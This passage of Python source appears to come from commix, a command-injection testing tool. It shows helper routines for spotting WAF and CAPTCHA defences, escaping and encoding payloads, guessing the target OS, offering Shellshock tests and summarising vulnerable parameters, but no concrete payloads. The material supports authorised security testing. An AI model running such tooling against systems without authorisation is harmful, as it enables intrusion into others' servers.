      err_msg = "The '" + str(codec) + "' is " + str(err).split(":")[0] + ". "
    if codec == settings.DEFAULT_CODEC:
      error_occurred = True
      break

  # If there was an error, advise the user
  if error_occurred:
    err_msg += "Re-run with"
    if menu.options.codec is None:
      err_msg += "out"
    err_msg += " option '--codec'."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Ignore verbatim payload reflections so they cannot trigger a false positive.
"""
def remove_reflected_values(html_data, payload):
  if not payload:
    return html_data
  decoded_payload = _urllib.parse.unquote(payload)
  if decoded_payload and decoded_payload in html_data:
    if not settings.REFLECTIVE_VALUE_FOUND:
      settings.REFLECTIVE_VALUE_FOUND = True
      warn_msg = "The response appears to reflect the target parameter value(s). Filtering reflected content."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    html_data = html_data.replace(decoded_payload, settings.SINGLE_WHITESPACE)
  return html_data

"""
Returns header value ignoring the letter case
"""
def get_header(headers, key):
  value = None
  for _ in (headers or {}):
    if _.upper() == key.upper():
      value = headers[_]
      break
  return value

"""
Checks regarding a recognition of generic "your ip has been blocked" messages.
"""
def blocked_ip(page):
  if not settings.BLOCKED_IP_DETECTED and re.search(settings.BLOCKED_IP_REGEX, page):
    settings.BLOCKED_IP_DETECTED = True
    settings.WAF_ENABLED = True
    persist_waf_finding()
    warn_msg = "It appears the target server has blocked you."
    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential browser verification protection mechanism.
"""
def browser_verification(page):
  if not settings.BROWSER_VERIFICATION and re.search(r"(?i)browser.?verification", page or ""):
    settings.BROWSER_VERIFICATION = True
    settings.WAF_ENABLED = True
    persist_waf_finding()
    warn_msg = "Potential browser verification protection mechanism detected"
    if re.search(r"(?i)CloudFlare", page):
      warn_msg += " (CloudFlare)."
    else:
      warn_msg += "."
    settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))

"""
Checks regarding a potential CAPTCHA protection mechanism.
"""
def captcha_check(page):
  if not settings.CAPTCHA_DETECED and re.search(r"(?i)captcha", page or ""):
    for match in re.finditer(r"(?si)<form.+?</form>", page):
      if re.search(r"(?i)captcha", match.group(0)):
        settings.CAPTCHA_DETECED = True
        settings.WAF_ENABLED = True
        persist_waf_finding()
        warn_msg = "Potential CAPTCHA protection mechanism detected"
        if re.search(r"(?i)<title>[^<]*CloudFlare", page):
          warn_msg += " (CloudFlare)."
        else:
          warn_msg += "."
        if settings.CRAWLING:
          settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
        settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
        break

"""
Checking the reliability of the used payload message.
"""
def check_for_false_positive_result(false_positive_warning):
  # The search that was counting itself off in dots has just found what it was looking for, so its
  # line is finished - said so, rather than left hanging while the next line reports the finding.
  if settings.PROGRESS_LINE_OPEN:
    settings.print_data_to_stdout(" (done)")
  info_msg = "Identified a potential injection point on "
  info_msg += settings.CHECKING_PARAMETER + "."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  info_msg = "Testing" + (" with a longer delay to rule out noise" if false_positive_warning else "")
  info_msg += " if the injection point is a false positive"  
  if settings.VERBOSITY_LEVEL != 0:
    info_msg = info_msg + "." + settings.END_LINE.LF
  else:
    info_msg = info_msg +", please wait..."
  settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))

"""
False positive or unexploitable injection point detected.
"""
def unexploitable_point(retry_attempt=None, retry_total=None):
  if settings.VERBOSITY_LEVEL == 0:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  warn_msg = "Detected a false positive or unexploitable injection point. Trying for re-verification"
  warn_msg += (" (" + str(retry_attempt) + "/" + str(retry_total) + ").") if retry_attempt else "."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Url decode specific chars of the provided payload.
"""
def url_decode(payload):
  rep = {
          "%20": " ",
          "%2B": "+",
          settings.END_LINE.LF: settings.END_LINE.ESCAPED_LF
        }
  rep = dict((re.escape(k), v) for k, v in rep.items())
  pattern = re.compile("|".join(rep.keys()))
  payload = pattern.sub(lambda m: rep[re.escape(m.group(0))], payload)
  return payload

"""
Check current assessment phase.
"""
def assessment_phase():
  if settings.DETECTION_PHASE:
    if settings.CRAWLING_PHASE:
      return "crawling"
    else:
      return "detection"
  else:
    return "exploitation"

"""
Fix single / double quote escaping.
"""
def escaped_cmd(cmd):
  if "\\\"" in cmd :
    cmd = cmd.replace("\\\"","\"")
  if "\'" in cmd :
    cmd = cmd.replace("\'","'")
  if r"\$" in cmd :
    cmd = cmd.replace(r"\$","$")
  return cmd

"""
Escape only the "$" sitting outside single quotes - single-quoted interpreter code (php -r '...', perl -e '...') is
already literal in both a shell and PHP, so a backslash there reaches the interpreter as a syntax error instead.
"""
def escape_unquoted_dollars(payload):
  escaped = []
  inside_single_quotes = False
  for char in payload:
    if char == "'":
      inside_single_quotes = not inside_single_quotes
    if char == "$" and not inside_single_quotes:
      escaped.append("\\")
    escaped.append(char)
  return "".join(escaped)

"""
Removing the first and/or last line of the html content (in case there are/is empty).
"""
def remove_empty_lines(content):
  try:
    if content[0] == settings.END_LINE.LF:
      content = content[1:content.rfind(settings.END_LINE.LF)]
    if content[-1] == settings.END_LINE.LF:
      content = content[:content.rfind(settings.END_LINE.LF)]
  except IndexError:
    pass
  return content

"""
Build the vulnerability or session-resume message for a confirmed parameter.
"""
def vulnerable_message(url):
  message = ""
  if settings.LOAD_SESSION:
    message = "Resumed "
  message += settings.CHECKING_PARAMETER
  if settings.LOAD_SESSION:
    message += " injection point from stored session"
  else:
    message += " is vulnerable"
  message += "."
  if settings.CRAWLING:
    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)
  return message

"""
Ask to keep testing others after a confirmed finding - True means stop (quit/break).
"""
def prompt_keep_testing(url):
  message = vulnerable_message(url) + " Do you want to keep testing the others (if any)? [y/N] "
  procced_option = common.read_input(message, default="N", check_batch=True)
  return procced_option in settings.CHOICE_NO

"""
Reduce a technique name to its bare name for the summary block's "Technique:" line -
drops the "command injection"/"injection" filler word and the trailing "technique" word.
"""
def summary_technique_label(technique):
  label = short_technique_label(technique)
  if label.endswith(" technique"):
    label = label[:-len(" technique")]
  label = label[0].upper() + label[1:]
  if technique == settings.INJECTION_TECHNIQUE.OOB and oob_channel_label():
    label += " (" + oob_channel_label() + ")"
  return label

"""
Name the channel an out-of-band finding came back over - a name lookup, or an HTTP(S) request.
"""
def oob_channel_label(transport=None):
  transport = transport or settings.OOB_TRANSPORT
  if not transport:
    return ""
  if transport == "dns":
    return "DNS"
  return (settings.OOB_SCHEME or "https").upper()

"""
Name the boundary combination a finding was confirmed with - logged, not printed.
"""
def finding_title(separator, whitespace, prefix, suffix):
  parts = []
  if separator:
    parts.append("'" + separator + "' separator")
  if whitespace:
    parts.append("'" + whitespace + "' whitespace")
  if prefix:
    parts.append("prefix '" + prefix + "'")
  if suffix:
    parts.append("suffix '" + suffix + "'")
  return ", ".join(parts)

"""
The detail lines of a summary block - shared by the console summary and the log file.
"""
def finding_summary_lines(technique, injection_type, payload, title=None):
  lines = ["  " + settings.SUB_CONTENT_SIGN_TYPE + "Technique: " + summary_technique_label(technique),
           "  " + settings.SUB_CONTENT_SIGN_TYPE + "Type: " + injection_type[0].upper() + injection_type[1:]]
  if title:
    lines.append("  " + settings.SUB_CONTENT_SIGN_TYPE + "Boundary: " + title)
  lines.append("  " + settings.SUB_CONTENT_SIGN_TYPE + "Payload: " + payload)
  return lines

"""
The parameter header line of a summary block.
"""
def finding_parameter_line(vuln_parameter, http_request_method):
  return settings.SUB_CONTENT_SIGN + "'" + vuln_parameter + "' (" + http_request_method + "):"

"""
Print one block per row, grouped by parameter - rows start with
(technique, injection_type, vuln_parameter, payload, http_request_method).
"""
def _injection_points_summary(header_msg, rows, decode_payload=False):
  settings.print_data_to_stdout(Style.BRIGHT + header_msg + Style.RESET_ALL)
  prev_parameter = None
  for index, row in enumerate(rows):
    if index > 0:
      settings.print_data_to_stdout("")
    technique, injection_type, vuln_parameter, payload, http_request_method = row[:5]
    current_parameter = (vuln_parameter, http_request_method)
    if current_parameter != prev_parameter:
      settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + "'"  + Style.BRIGHT + vuln_parameter + Style.RESET_ALL + "' (" + http_request_method + "):")
      prev_parameter = current_parameter
    if decode_payload:
      payload = str(url_decode(payload))
    for line in finding_summary_lines(technique, injection_type, payload):
      settings.print_data_to_stdout(line)

"""
Print a summary of the injection points restored from a stored session.
"""
def resumed_injection_points_summary(rows):
  # Stored payloads are url-encoded, unlike the ones held in memory this run.
  _injection_points_summary("Resumed the following injection point(s) from stored session:", rows, decode_payload=True)

"""
Print a summary of every injection point confirmed this run, deferred until quit() (one block per technique).
"""
def confirmed_injection_points_summary():
  rows = settings.CONFIRMED_INJECTION_POINTS
  if len(rows) == 1:
    header_msg = "Identified the following injection point with a total of " + str(rows[0][5]) + " HTTP(S) requests:"
  else:
    header_msg = "Identified the following injection point(s):"
  _injection_points_summary(header_msg, rows)

"""
Check 'os_shell' options
"""
def check_os_shell_options(cmd, filename, url):
  if cmd in settings.SHELL_OPTIONS or cmd.split(" ", 1)[0] in ("use", "download", "upload"):
    if cmd == "?":
      menu.os_shell_options()
    elif cmd == "back":
      # Shell opens only after detection - nothing to go back to.
      quit(filename, url, hard_exit=True)
    else:
      return cmd

"""
Procced with file-based semiblind command injection technique,
once the user provides the path of web server's root directory.
"""
def procced_with_file_based_technique():
  while True:
    message = "Due to the provided '--web-root' option, "
    message += "do you want to proceed with the (semi-blind) "
    message += "file-based injection technique? [y/N] "
    enable_fb = common.read_input(message, default="N", check_batch=True)
    if enable_fb in settings.CHOICE_YES:
      return True
    elif enable_fb in settings.CHOICE_NO:
      return False
    elif enable_fb in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(enable_fb)
      pass

"""
Map a TCP mode's returned option to an action: 0 stay, 1 back, 2 os_shell, 3 the other mode.
"""
def check_tcp_mode_result(option, other_mode):
  if option == False:
    return 0
  elif option == "back":
    return 1
  elif option == "os_shell":
    return 2
  elif option == other_mode:
    return 3

"""
An HTTP error code together with the reason phrase the server sent with it, where it sent one.
"""
def http_error_code_label(code, err=None):
  reason = str(getattr(err, "reason", "") or "").strip()
  return str(code) + (" " + reason if reason else "")

"""
Whether an HTTP error code is one the user chose to ignore, with '--ignore-code'.
"""
def ignored_http_error_code(code):
  try:
    return int(code) in [int(_) for _ in settings.IGNORE_CODE]
  except (TypeError, ValueError):
    return False

"""
Ignore the error and continue testing; the choice is remembered for this code.
"""
def continue_tests(err):
  # Ignoring (problematic) HTTP error codes.
  if ignored_http_error_code(getattr(err, "code", None)):
    return True

  # Possible WAF/IPS
  try:
    detect_waf(err.code)
    if int(err.code) not in settings.WARNED_HTTP_ERROR_CODES:
      warn_msg = "The web server responded with an HTTP error code '" + http_error_code_label(err.code, err)
      warn_msg += "' which could interfere with the results of the tests."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
      settings.WARNED_HTTP_ERROR_CODES.add(int(err.code))
    return True
  except AttributeError:
    # No HTTP code (e.g. connection reset) - retry a bounded number of times.
    if stability.should_retry_connection_error(err):
      return True
    settings.print_data_to_stdout(settings.print_critical_msg(err))
    return False
  except KeyboardInterrupt:
    raise

"""
The options a Windows target cannot serve, already reported.
"""
UNAVAILABLE_OPTIONS = set()

"""
Check if option is unavailable
"""
def unavailable_option(check_option):
  # Reported once, wherever it was first said - the users enumeration says it in passing.
  if check_option in UNAVAILABLE_OPTIONS:
    return
  UNAVAILABLE_OPTIONS.add(check_option)
  warn_msg = "The option '" + check_option + "' "
  warn_msg += "is currently not supported on Windows targets."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
No permission to list the target's users - said together with the password enumeration that a
Windows target cannot serve either, so the two do not take a line each.
"""
def no_user_enumeration_permission():
  warn_msg = "It seems you do not have permission to enumerate operating system users"
  if settings.TARGET_OS == settings.OS.WINDOWS and menu.options.passwords:
    warn_msg += ", and the switch '--passwords' is not supported on Windows targets"
    UNAVAILABLE_OPTIONS.add("--passwords")
  warn_msg += "."
  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))

"""
Information message if platform does not have
GNU 'readline' module installed.
"""
def no_readline_module():
  err_msg =  "It seems your platform does "
  err_msg += "not have GNU 'readline' module installed."
  err_msg += " Download the"
  if settings.IS_WINDOWS:
    err_msg += " 'pyreadline' package (https://pypi.python.org/pypi/pyreadline) or the 'pyreadline3' package (https://pypi.python.org/pypi/pyreadline3) instead."
  elif settings.PLATFORM == "mac":
    err_msg += " 'gnureadline' package (https://pypi.python.org/pypi/gnureadline)."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))

"""
Check for incompatible OS (i.e. Unix).
"""
def ps_incompatible_os():
  if not settings.TARGET_OS == settings.OS.WINDOWS:
    warn_msg = "The identified OS seems incompatible with the provided '--ps-version' switch."
    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    return True

"""
Check if PowerShell is enabled.
"""
def ps_check():
  if settings.PS_ENABLED == None and menu.options.is_admin or menu.options.users or menu.options.passwords:
    if settings.VERBOSITY_LEVEL != 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
    while True:
      message = "Some payloads in the selected options require PowerShell. "
      message += "Do you want to use the '--ps-version' flag "
      message += "to ensure it is enabled? [Y/n] "
      ps_check = common.read_input(message, default="Y", check_batch=True)
      if ps_check in settings.CHOICE_YES:
        menu.options.ps_version = True
        break
      elif ps_check in settings.CHOICE_NO:
        break
      elif ps_check in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(ps_check)
        pass

"""
If PowerShell is disabled.
"""
def ps_check_failed():
  while True:
    message = "Do you want to proceed despite the above warning? [Y/n] "
    ps_check = common.read_input(message, default="Y", check_batch=True)
    if ps_check in settings.CHOICE_YES:
      break
    elif ps_check in settings.CHOICE_NO:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      os._exit(0)
    else:
      common.invalid_option(ps_check)
      pass

"""
Perform basic heuristic checks for CGI scripts potentially vulnerable to Shellshock.
"""
def check_CGI_scripts(url):

  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking the target URL for known CGI scripts."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  CGI_SCRIPTS = common.load_list_from_file(settings.CGI_SCRIPTS, "CGI scripts list")

  _ = False
  for cgi_script in CGI_SCRIPTS:
    if cgi_script in url:
      from src.utils import session_handler
      if session_handler.has_stored_shellshock(url):
        # Already confirmed - the resumed summary says so.
        menu.options.shellshock = True
        return

      info_msg = "Heuristic (basic) test shows that target URL might be vulnerable to Shellshock "
      info_msg += "(detected script: '" + cgi_script + "')."
      _ = True
      settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))

      while True:
        message = "Do you want to test for the Shellshock vulnerability, using the '--shellshock' module? [Y/n] "
        shellshock_check = common.read_input(message, default="Y", check_batch=True)
        if shellshock_check in settings.CHOICE_YES:
          menu.options.shellshock = True
          return
        elif shellshock_check in settings.CHOICE_NO:
          menu.options.shellshock = False
          return
        elif shellshock_check in settings.CHOICE_QUIT:
          raise SystemExit()
        else:
          common.invalid_option(shellshock_check)
          pass

  if not _:
    if settings.VERBOSITY_LEVEL != 0:
      debug_msg = "No known CGI script found, skipping the '--shellshock' module."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    menu.options.shellshock = False

"""
Safely parse a target URL into components.
"""
def check_url(url):
  try:
    return _urllib.parse.urlsplit(url)
  except ValueError:
    err_msg = "Invalid target URL provided. "
    err_msg += "Please ensure there are no leftover characters (e.g. '[' or ']') "
    err_msg += "in the hostname part."
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

"""
Verify whether the URL scheme is HTTP or HTTPS.
"""
def check_http_s(url):
  # A fragment never leaves the client, so a payload placed after one would silently not be sent.
  if "#" in url:
    url, fragment = url.split("#", 1)
    if fragment and not settings.FRAGMENT_IGNORED:
      settings.FRAGMENT_IGNORED = True
      warn_msg = "Ignoring the fragment ('#" + fragment + "') of the provided URL, since it is not sent to the target."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
  url_split = check_url(url)
  if url_split.username and url_split.password and "@" in url_split.netloc:
    url = url.replace(url_split.netloc,url_split.netloc.split("@")[1])
 
  if settings.SINGLE_WHITESPACE in url:
    url = url.replace(settings.SINGLE_WHITESPACE, _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE))

  if not menu.options.proxy and (_urllib.parse.urlparse(url).hostname in ("localhost", "127.0.0.1") or menu.options.ignore_proxy):
    menu.options.ignore_proxy = True

  if settings.CHECK_INTERNET:
      url = settings.CHECK_INTERNET_ADDRESS
  else:
    if re.search(r'^(?:http)s?://', url, re.I):
      if not re.search(r"^(http|ws)s?://", url, re.I):
        if re.search(r":443\b", url):
          url = "https://" + url
        else:
          url = "http://" + url
      settings.SCHEME = (url_split.scheme.strip().lower() or "http") if not menu.options.force_ssl else "https"
    else:
      err_msg = "Invalid target URL provided. "
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

  if _urllib.parse.urlparse(url).scheme != settings.SCHEME:
    if menu.options.force_ssl and settings.VERBOSITY_LEVEL != 0:
      debug_msg = "Forcing usage of SSL/HTTPS requests."
      settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
    url = url.replace(_urllib.parse.urlparse(url).scheme, settings.SCHEME)

  return url

"""
Checking connection (resolving hostname).
"""
def check_connection(url):
  hostname = _urllib.parse.urlparse(url).hostname or ''
  if not re.search(r"\A\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\Z", hostname):
    if not any((menu.options.proxy, menu.options.tor, menu.options.offline)):
      try:
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Resolving hostname '" + hostname + "'."
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        socket.getaddrinfo(hostname, None)
      except socket.gaierror:
        err_msg = "Host '" + hostname + "' does not exist."
        if not settings.MULTI_TARGETS:
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()
      except (socket.error, UnicodeError):
        err_msg = "Problem occurred while "
        err_msg += "resolving the hostname '" + hostname + "'"
        if not settings.MULTI_TARGETS:
          settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
          raise SystemExit()

"""
Force the user-defined operating system.
"""
def user_defined_os():
  if menu.options.os:
    if menu.options.os.lower() == "windows":
      settings.TARGET_OS = settings.OS.WINDOWS
      return True
    # Both spellings, since 'Unix-like' is what commix calls the family everywhere else and 'Unix'
    # is what this switch has always taken.
    elif menu.options.os.lower() in ("unix", "unix-like"):
      return True
    else:
      err_msg = "You defined an invalid value '" + menu.options.os + "' "
      err_msg += "for the operating system. The value must be 'Windows' or 'Unix-like'."
      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
      raise SystemExit()

"""
Define the target operating system.
"""
def define_target_os():
  # If "--shellshock" option is provided then, by default is a Linux/Unix operating system.
  if menu.options.shellshock:
    return
  else:
    while True:
      """
      The shell is what could not be worked out; the operating system is what a person can
      answer, and the shell follows from it. "the server's underlying" belonged to the banner
      check that used to ask this - the question is about the target now, however it answered.
      """
      message = "Do you recognize the target's operating system? "
      message += "[(N)o/(u)nix-like/(w)indows/(q)uit] "
      got_os = common.read_input(message, default="N", check_batch=True)
      if got_os.lower() in settings.CHOICE_OS :
        if got_os.lower() == "u":
          return
        elif got_os.lower() == "w":
          settings.TARGET_OS = settings.OS.WINDOWS
          return
        elif got_os.lower() == "n":
          settings.CHECK_BOTH_OS = True

          return
        elif got_os.lower() == "q":
          raise SystemExit()
      else:
        common.invalid_option(got_os)
        pass

"""
The one name the target's operating system is given, wherever it is printed.
"""
"""
A payload, escaped to sit inside a JSON string.

A JSON string may not hold a raw control character, and three of the separators are exactly that -
a newline, a carriage return and a substitute character. Left as they were the body was not JSON at
all, the parser refused it, and the technique looked inapplicable to every JSON endpoint for a
reason that had nothing to do with the target. The backslash goes too, or one in the payload
escapes whatever follows it.
"""
def escape_json_value(value):
  escaped = ""
  for char in value:
    if char < " " or char in ("\"", "\\"):
      escaped += json.dumps(char)[1:-1]
    else:
      escaped += char
  return escaped

"""
A payload, with the characters XML cannot carry taken out.

XML 1.0 admits no control character but tab, newline and carriage return - a substitute character
in a document makes it unparseable wherever it appears, so the separator that is one cannot travel
this way at all.
"""
def strip_xml_forbidden(value):
  return "".join(char for char in value if char >= " " or char in "\t\n\r")

"""
Take the evaluated language from something the target already said about itself.

'X-Powered-By: PHP/5.5.9' names the language before a single probe is sent, and the sweep would
otherwise go looking for it. Only a language commix has a grammar for counts, and only where the
user named none - what they asked for outranks what a header happens to mention.
"""
def note_evaluated_language(*banners):
  if settings.IDENTIFIED_EVAL_LANGUAGE:
    return
  if menu.options.eval_sink and menu.options.eval_sink != settings.EVAL_ALL_LANGUAGES:
    return
  # Whichever of them names a language first: the URL's own extension is the narrower answer, and
  # the header behind it names what the extension cannot spell.
  for banner in banners:
    if not banner:
      continue
    # A '.py' extension names Python as surely as the word does, so the short names count too.
    for name in list(settings.SUPPORTED_EVAL_LANGUAGES) + list(settings.LANGUAGE_ALIASES):
      if re.search(r"\b" + re.escape(name) + r"\b", banner, re.IGNORECASE):
        language = settings.resolve_language(name)
        if language in settings.SUPPORTED_EVAL_LANGUAGES:
          settings.IDENTIFIED_EVAL_LANGUAGE = language
          return

def encode_payload(payload):
  """
  A payload, encoded for a carrier that is URL-encoded.

  '%' is left alone, because the payloads write their own encoded sequences and re-encoding those
  would send '%2520' where '%20' was meant. That leaves the corner case of a '%' that really is a
  per-cent sign: it is not part of a '%XX', the target reads it as the start of one, and a strict
  server answers 400 rather than running anything.

  So a '%' with no two hex digits behind it is made '%25' first - unless a tamper script is in play,
  since those write escapes of their own and this cannot tell theirs from a stray one.
  """
  if "%" in payload and not menu.options.tamper:
    payload = re.sub(r"%(?![0-9a-fA-F]{2})", "%25", payload)
  return _urllib.parse.quote(payload, safe=settings.payload_safe_chars())

def target_shell_label():
  """
  What a payload that executed actually established: which shell understood it.

  Not the operating system - a POSIX shell answers on Windows too, under WSL, Cygwin, Git Bash or
  busybox, so 'a POSIX shell ran this' is no evidence of a Unix-like host. Which syntax works is
  also the more useful half for whoever is reading, being the half they would act on.

  The standard rather than a shell's name, because which one it is was never asked: 'sh', 'bash',
  'dash' and 'zsh' all answer the same syntax, and only that syntax was shown to work.
  """
  return "cmd.exe" if settings.TARGET_OS == settings.OS.WINDOWS else "POSIX"

def target_os_label():
  """
  What is known is the family, not the distribution: which of the two payload shapes the target
  answered. Windows names itself; everything else is Linux, macOS, a BSD or another Unix - so the
  umbrella term for those is what is reported, rather than the shell that gave it away.
  """
  return settings.OS.WINDOWS.title() if settings.TARGET_OS == settings.OS.WINDOWS else "Unix-like"

"""
Record an identified operating system. Every check that fingerprints one comes through here, so the
value stored is always one of the two the rest of the code compares against - a server banner naming
a distribution is a name for that banner, not for the operating system - and a user who named their
own with '--os' is asked about a disagreement once, rather than being overruled by whichever check
happened to run last.
"""
def set_target_os(identified):
  if not identified:
    return
  identified = settings.OS.WINDOWS if re.search(r"microsoft|win", identified, re.IGNORECASE) else settings.OS.UNIX
  previous = settings.TARGET_OS
  settings.TARGET_OS = identified
  settings.IDENTIFIED_TARGET_OS = True
  if menu.options.os:
    user_os = settings.OS.WINDOWS if menu.options.os.lower() == settings.OS.WINDOWS else settings.OS.UNIX
    if user_os != identified and identified_os():
      settings.TARGET_OS = user_os
  # A document root guessed before the operating system was settled is not one now.
  if settings.TARGET_OS != previous and not settings.USER_APPLIED_WEB_ROOT and not settings.CUSTOM_WEB_ROOT:
    if not web_root_matches_os(settings.WEB_ROOT):
      settings.WEB_ROOT = settings.DEFAULT_WEB_ROOT = ""

"""
Decision if the user-defined operating system name,
is different than the one identified by heuristics.
"""
def identified_os():
    # Asked once; every target after that is answered with what was decided then, rather than with
    # nothing - which read as 'keep the identified one' and quietly dropped the user's own '--os'.
    if settings.IGNORE_IDENTIFIED_TARGET_OS is not None:
      return settings.IGNORE_IDENTIFIED_TARGET_OS
    if settings.IGNORE_IDENTIFIED_TARGET_OS == None:
      # Named the way the heuristics name it, so whichever check spotted the difference, the two
      # messages read as the one finding rather than as two operating systems.
      warn_msg = "Identified a different operating system (i.e. '"
      warn_msg += target_os_label() + "') than the one you defined (i.e. '" + menu.options.os.title() + "')."
      settings.print_data_to_stdout(settings.print_bold_warning_msg(warn_msg))
      message = "How do you want to proceed? [(C)ontinue/(s)kip] "
      while True:
        proceed_option = (common.read_input(message, default="S", check_batch=True) or "S").strip().lower()
        if proceed_option in ("c", "s", "q"):
          break
        common.invalid_option(proceed_option)
      if proceed_option == "c":
        settings.IGNORE_IDENTIFIED_TARGET_OS = True
        return settings.IGNORE_IDENTIFIED_TARGET_OS
      elif proceed_option == "s":
        settings.IGNORE_IDENTIFIED_TARGET_OS = False
        return settings.IGNORE_IDENTIFIED_TARGET_OS
      elif proceed_option == "q":
        raise SystemExit()

"""
Checking for all required third-party library dependencies.
"""
def third_party_dependencies():
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Checking for all required third-party library dependencies."
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))

  try:
    import sqlite3
  except ImportError:
    err_msg = settings.APPLICATION + " requires 'sqlite3' third-party library "
    err_msg += "to store previous injection points and commands. "
    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
    raise SystemExit()

  try:
    import readline
  except (ImportError, AttributeError):
    if settings.IS_WINDOWS:
      try:
        import pyreadline
      except ImportError:
        err_msg = "TAB completion and history support features require "
        err_msg += "the 'pyreadline' (third-party) library."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    elif settings.PLATFORM == "posix":
      try:
        import gnureadline
      except ImportError:
        err_msg = "TAB completion and history support features require "
        err_msg += "the 'gnureadline' (third-party) library."
        settings.print_data_to_stdout(settings.print_error_msg(err_msg))
    pass

"""
Print the authentiation error message.
"""
def http_auth_err_msg():
  err_msg = "Use the '--auth-cred' option to provide a valid pair of "
  err_msg += "HTTP authentication credentials (e.g. '--auth-cred=admin:admin'), "
  err_msg += "or use the '--ignore-code=401' option to ignore HTTP error 401 (Unauthorized) "
  err_msg += "and continue tests without providing valid credentials."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
Error while accessing session file
"""
def error_loading_session_file():
  err_msg = "An error occurred while accessing session file ('"
  err_msg += settings.SESSION_FILE + "'). "
  err_msg += "Use the '--flush-session' switch."
  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
  raise SystemExit()

"""
EOFError
"""
def EOFError_err_msg():
  if settings.STDIN_PARSING:
    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  err_msg = "Exiting, due to EOFError."
  settings.print_data_to_stdout(settings.print_error_msg(err_msg))

"""
Ask whether to ignore an already-completed action's stored session and redo it.
"""
def ask_redo_stored_session(verb, redo_action):
  while True:
    message = "Do you want to ignore stored session and " + verb + " again? [y/N] "
    again = common.read_input(message, default="N", check_batch=True)
    if again in settings.CHOICE_YES:
      """
      Ignored for this one action, then put back. The answer was about redoing what was just asked
      about, not about the rest of the run - left set, every stored result after it is re-fetched
      from the target, including the ones a later prompt of its own would have offered to keep.
      """
      stored_choice = menu.options.ignore_session
      menu.options.ignore_session = True
      try:
        redo_action()
      finally:
        menu.options.ignore_session = stored_choice
      return
    elif again in settings.CHOICE_NO:
      return
    elif again in settings.CHOICE_QUIT:
      raise SystemExit()
    else:
      common.invalid_option(again)

"""
Message regarding unexpected time delays due to unstable requests
"""
def time_delay_due_to_unstable_request(timesec):
  if settings.UNSTABLE_REQUEST_CHOICE:
    if settings.UNSTABLE_REQUEST_CHOICE == "c" and settings.UNSTABLE_REQUEST_BUMPS < settings.MAX_UNSTABLE_TIMESEC_BUMP:
      timesec = timesec + 1
      settings.UNSTABLE_REQUEST_BUMPS = settings.UNSTABLE_REQUEST_BUMPS + 1
    return timesec, settings.UNSTABLE_REQUEST_CHOICE == "c"

  message = "Unexpected time delays have been identified."
  settings.print_data_to_stdout(settings.END_LINE.CR)
  while True:
    message = message + " How do you want to proceed? [(C)ontinue with a longer delay/(s)kip this candidate and try the next] "
    proceed_option = common.read_input(message, default="C", check_batch=True)
    if proceed_option.lower() in settings.CHOICE_PROCEED :
      if proceed_option.lower() == "c":
        settings.UNSTABLE_REQUEST_CHOICE = "c"
        settings.UNSTABLE_REQUEST_BUMPS = 1
        timesec = timesec + 1
        false_positive_fixation = True
        return timesec, false_positive_fixation
      elif proceed_option.lower() == "s":
        settings.UNSTABLE_REQUEST_CHOICE = "s"
        false_positive_fixation = False
        return timesec, false_positive_fixation
      elif proceed_option.lower() == "q":
        raise SystemExit()
    else:
      common.invalid_option(proceed_option)
      pass

"""
True only for a genuinely finished stored value - a partial (interrupted-run) marker isn't a result yet, and must be treated the same as "nothing stored" so the caller re-runs (and thereby resumes) it instead of handing back the raw marker.
"""
def usable_stored_cmd(stored_value):
  return bool(stored_value) and not stored_value.startswith(settings.PARTIAL_VALUE_MARKER)

"""
Drop high-latency spikes from a response-time sample via a median/MAD cutoff.
"""
def strip_time_outliers(values):
  if not values or len(values) < settings.MIN_OUTLIER_SAMPLE:
    return values
  ordered = sorted(values)
  median = ordered[len(ordered) // 2]
  mad = sorted(abs(value - median) for value in values)[len(values) // 2]
  if mad > 0:
    cutoff = median + settings.TIME_OUTLIER_MAD_COEFF * 1.4826 * mad
  elif median > 0:
    # A deviation of zero is what a steady target looks like, not a reason to keep a spike: with
